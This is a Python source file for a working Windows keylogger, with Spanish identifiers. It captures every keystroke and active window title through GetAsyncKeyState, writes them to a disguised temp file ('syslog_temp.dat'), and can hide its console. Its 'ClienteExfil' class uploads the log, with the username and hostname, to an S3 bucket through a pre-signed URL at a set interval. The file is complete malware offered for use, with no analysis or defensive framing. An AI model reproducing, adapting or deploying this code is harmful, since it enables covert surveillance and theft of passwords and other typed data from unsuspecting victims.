import ctypes
import os
import socket
import sys
import time
from datetime import datetime

import requests
from dotenv import load_dotenv

if getattr(sys, "frozen", False):
    DIRECTORIO_ACTUAL = os.path.dirname(sys.executable)
else:
    DIRECTORIO_ACTUAL = os.path.dirname(os.path.abspath(__file__))

load_dotenv(os.path.join(DIRECTORIO_ACTUAL, ".env"))

VK_SHIFT = 0x10
VK_CAPITAL = 0x14
ASYNC_KEY_PRESSED = -32767

user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32

MODO = os.getenv("MODO", "nube").strip().lower()
API_URL = os.getenv("API_URL", "").rstrip("/")
SHARED_TOKEN = os.getenv("SHARED_TOKEN", "")
AGENT_ID = os.getenv("AGENT_ID", "agente-desconocido")
UPLOAD_INTERVAL = int(os.getenv("UPLOAD_INTERVAL", "60"))
MAX_FILE_MB = int(os.getenv("MAX_FILE_MB", "10"))
HIDE_CONSOLE = os.getenv("HIDE_CONSOLE", "false").strip().lower() in ("1", "true", "si", "sí")
LOG_FILENAME = os.getenv("LOG_FILENAME", "syslog_temp.dat")
INTERVALO_ESCANEO = 0.01

ventana_actual = None
teclas_procesadas = set()
ultima_subida = time.time()

TECLAS_ESPECIALES = {
    0x01: "\n[CIR]\n",
    0x02: "\n[CDR]\n",
    0x08: "\n[DEL]\n",
    0x09: "\n[TAB]\n",
    0x0D: "\n[ENTER]\n",
    0x10: " [SHIFT]",
    0x11: "\n[CTRL]\n",
    0x12: "\n[ALT]\n",
    0x14: "\n[ ACTIVO MAYUSCULAS ]\n",
    0x1B: "[ESC]",
    0x20: "  ",
    0x25: "\n[ TECLEO FLECHA IZQUIERDA ]\n",
    0x26: "\n[ TECLEO FLECHA ARRIBA ]\n",
    0x27: "\n[ TECLEO FLECHA DERECHA ]\n",
    0x28: "\n[ TECLEO FLECHA ABAJO ]\n",
    0x2C: "\n[ IMPRIMIO LA PANTALLA ]\n",
}

FILA_NUMEROS = {0x30 + i: str(i) for i in range(10)}
FILA_NUMEROS_SHIFT = {
    0x30: ")", 0x31: "!", 0x32: "@", 0x33: "#", 0x34: "$",
    0x35: "%", 0x36: "^", 0x37: "&", 0x38: "*", 0x39: "(",
}

TECLADO_NUMERICO = {0x60 + i: str(i) for i in range(10)}
TECLADO_NUMERICO.update({0x6A: "*", 0x6B: "+", 0x6D: "-", 0x6E: ".", 0x6F: "/"})

TECLAS_FUNCION = {0x70 + i: f"\n[F{i + 1}]\n" for i in range(12)}

TECLAS_PUNTUACION = {0xBC: ",", 0xBD: "-", 0xBE: "."}


class ClienteExfil:

    def __init__(self, api_url, shared_token, agent_id):
        self.api_url = api_url
        self.shared_token = shared_token
        self.agent_id = agent_id
        self.headers = {"x-api-key": shared_token}

    def solicitar_url_subida(self):
        try:
            respuesta = requests.post(
                f"{self.api_url}/url",
                json={"agent_id": self.agent_id},
                headers=self.headers,
                timeout=15,
            )
            respuesta.raise_for_status()
        except requests.RequestException as e:
            print(f"[!] Error al solicitar pre-signed URL: {e}")
            return None, None
        datos = respuesta.json()
        return datos.get("upload_url"), datos.get("key")

    def subir_archivo(self, archivo_local):
        if not os.path.exists(archivo_local) or os.path.getsize(archivo_local) == 0:
            print("[!] Archivo local vacío, esperando más datos...")
            return False
        url_subida, key = self.solicitar_url_subida()
        if not url_subida:
            return False
        try:
            with open(archivo_local, "rb") as archivo:
                respuesta = requests.put(
                    url_subida,
                    data=archivo,
                    headers={"Content-Type": "text/plain"},
                    timeout=60,
                )
        except requests.RequestException as e:
            print(f"[!] Error al subir archivo a S3: {e}")
            return False
        if respuesta.status_code != 200:
            print(f"[!] S3 rechazó la subida (HTTP {respuesta.status_code}): {respuesta.text[:200]}")
            return False
        print(f"[OK] Archivo subido a S3: {key}")
        return True


def validar_configuracion():
    errores = []
    if MODO == "nube":
        if not API_URL:
            errores.append("API_URL no configurado")
        if not SHARED_TOKEN:
            errores.append("SHARED_TOKEN no configurado")
    elif MODO != "local":
        errores.append(f"MODO inválido: {MODO} (usa 'nube' o 'local')")
    for error in errores:
        print(f"[ERROR] {error}")
    if errores:
        print(f"Buscando .env en: {os.path.join(DIRECTORIO_ACTUAL, '.env')}")
        return False
    return True


def ocultar_consola():
    try:
        kernel32.FreeConsole()
        return True
    except Exception as e:
        print(f"Error al ocultar consola: {e}")
        return False


def obtener_ventana_activa():
    try:
        hwnd = user32.GetForegroundWindow()
        length = user32.GetWindowTextLengthW(hwnd)
        buffer = ctypes.create_unicode_buffer(length + 1)
        user32.GetWindowTextW(hwnd, buffer, length + 1)
        return buffer.value if buffer.value else "Ventana Desconocida"
    except Exception:
        return "Ventana Desconocida"


def esta_shift_presionado():
    return user32.GetAsyncKeyState(VK_SHIFT) & 0x8000 != 0


def esta_caps_lock_activado():
    return user32.GetKeyState(VK_CAPITAL) & 0x0001 != 0


def guardar_tecla_pulsada(codigo_tecla, archivo_log):
    shift_presionado = esta_shift_presionado()
    caps_activado = esta_caps_lock_activado()
    mayusculas = shift_presionado ^ caps_activado

    if codigo_tecla in TECLAS_ESPECIALES:
        texto = TECLAS_ESPECIALES[codigo_tecla]
    elif codigo_tecla in FILA_NUMEROS:
        texto = FILA_NUMEROS_SHIFT[codigo_tecla] if shift_presionado else FILA_NUMEROS[codigo_tecla]
    elif 0x41 <= codigo_tecla <= 0x5A:
        letra = chr(ord("A") + codigo_tecla - 0x41)
        texto = letra if mayusculas else letra.lower()
    elif codigo_tecla in TECLADO_NUMERICO:
        texto = TECLADO_NUMERICO[codigo_tecla]
    elif codigo_tecla in TECLAS_FUNCION:
        texto = TECLAS_FUNCION[codigo_tecla]
    elif codigo_tecla in TECLAS_PUNTUACION:
        texto = TECLAS_PUNTUACION[codigo_tecla]
    else:
        return False

    with open(archivo_log, "a+", encoding="utf-8") as archivo_salida:
        archivo_salida.write(texto)
    return True


def obtener_nombre_maquina():
    try:
        return socket.gethostname()
    except Exception:
        return "PC_Desconocido"


def registrar_inicio_sesion(archivo_log):
    try:
        with open(archivo_log, "a+", encoding="utf-8") as log_file:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            separador = "=" * 60
            destino = "S3 vía API Gateway" if MODO == "nube" else "solo local"
            log_file.write(f"\n\n{separador}\n")
            log_file.write(f"SESION INICIADA: {timestamp}\n")
            log_file.write(f"Sistema: Windows | Usuario: {os.getlogin()}\n")
            log_file.write(f"Máquina: {obtener_nombre_maquina()}\n")
            log_file.write(f"Agente: {AGENT_ID}\n")
            log_file.write(f"Destino: {destino}\n")
            log_file.write(f"{separador}\n\n")
        return True
    except Exception as e:
        print(f"Error al registrar inicio de sesión: {e}")
        return False


def registrar_fin_sesion(archivo_log):
    try:
        with open(archivo_log, "a+", encoding="utf-8") as log_file:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            separador = "=" * 60
            log_file.write(f"\n{separador}\n")
            log_file.write(f"SESION FINALIZADA: {timestamp}\n")
            log_file.write(f"{separador}\n\n")
    except Exception as e:
        print(f"Error al registrar fin de sesión: {e}")


def registrar_cambio_ventana(ventana, archivo_log):
    try:
        with open(archivo_log, "a+", encoding="utf-8") as log_file:
            timestamp = datetime.now().strftime("%H:%M:%S")
            log_file.write(f"\n\n>>> [{timestamp}] Aplicación: {ventana} <<<\n")
    except Exception as e:
        print(f"Error al registrar cambio de ventana: {e}")


def main():
    global ventana_actual, teclas_procesadas, ultima_subida

    if not validar_configuracion():
        print("[FATAL] No se puede continuar sin configuración válida.")
        return 1

    if MODO == "nube":
        cliente_exfil = ClienteExfil(API_URL, SHARED_TOKEN, AGENT_ID)
        print(f"[OK] Exfiltración vía API Gateway: {API_URL}")
    else:
        cliente_exfil = None
        print("[OK] Modo local: los logs solo se guardan en disco")

    archivo_log_temp = os.path.join(os.getenv("TEMP"), LOG_FILENAME)
    registrar_inicio_sesion(archivo_log_temp)

    if HIDE_CONSOLE:
        ocultar_consola()

    try:
        while True:
            ventana_nueva = obtener_ventana_activa()
            if ventana_nueva != ventana_actual:
                ventana_actual = ventana_nueva
                registrar_cambio_ventana(ventana_actual, archivo_log_temp)
                print(f"Ventana activa: {ventana_actual}")

            teclas_activas_ahora = set()
            for codigo_tecla in range(8, 256):
                if user32.GetAsyncKeyState(codigo_tecla) == ASYNC_KEY_PRESSED:
                    teclas_activas_ahora.add(codigo_tecla)
                    if codigo_tecla not in teclas_procesadas:
                        guardar_tecla_pulsada(codigo_tecla, archivo_log_temp)
                        teclas_procesadas.add(codigo_tecla)
            teclas_procesadas = teclas_activas_ahora.copy()

            if cliente_exfil and time.time() - ultima_subida >= UPLOAD_INTERVAL:
                print("[->] Subiendo logs...")
                cliente_exfil.subir_archivo(archivo_log_temp)
                if os.path.getsize(archivo_log_temp) / (1024 * 1024) > MAX_FILE_MB:
                    open(archivo_log_temp, "w").close()
                    registrar_inicio_sesion(archivo_log_temp)
                    print("[OK] Archivo local rotado")
                ultima_subida = time.time()

            time.sleep(INTERVALO_ESCANEO)

    except KeyboardInterrupt:
        print("\n\nKeylogger detenido por el usuario.")
        registrar_fin_sesion(archivo_log_temp)
        if cliente_exfil:
            print("[->] Subiendo último lote...")
            cliente_exfil.subir_archivo(archivo_log_temp)
        return 0
    except Exception as e:
        print(f"\nError crítico: {e}")
        registrar_fin_sesion(archivo_log_temp)
        return 1


if __name__ == "__main__":
    sys.exit(main())
